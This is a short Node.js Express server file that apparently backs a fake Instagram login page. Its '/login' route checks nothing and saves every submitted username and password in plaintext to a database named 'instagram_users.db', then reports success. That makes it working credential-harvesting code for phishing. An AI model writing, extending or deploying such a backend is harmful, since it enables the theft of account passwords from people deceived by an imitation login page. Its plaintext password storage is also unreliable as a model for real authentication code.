const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(bodyParser.json());
app.use(cors());
app.use(express.static(path.join(__dirname, '../frontend')));

const dbPath = path.join(__dirname, '../database/instagram_users.db');
const db = new sqlite3.Database(dbPath, (err) => {
    if (err) console.error(err);
    else console.log('✅ Connected to SQLite Database');
});

// Create table
db.run(`CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    login_time DATETIME DEFAULT CURRENT_TIMESTAMP
)`);

app.post('/login', (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ error: "Username and password are required" });
    }

    db.run(`INSERT INTO users (username, password) VALUES (?, ?)`,
        [username, password],
        function (err) {
            if (err) {
                console.error(err);
                return res.status(500).json({ error: "Failed to save user" });
            }
            console.log(`✅ User saved: ${username}`);
            res.json({ success: true, message: "Login data saved successfully!" });
        }
    );
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running at http://localhost:${PORT}`);
    console.log(`Open your browser and go to: http://localhost:${PORT}`);
});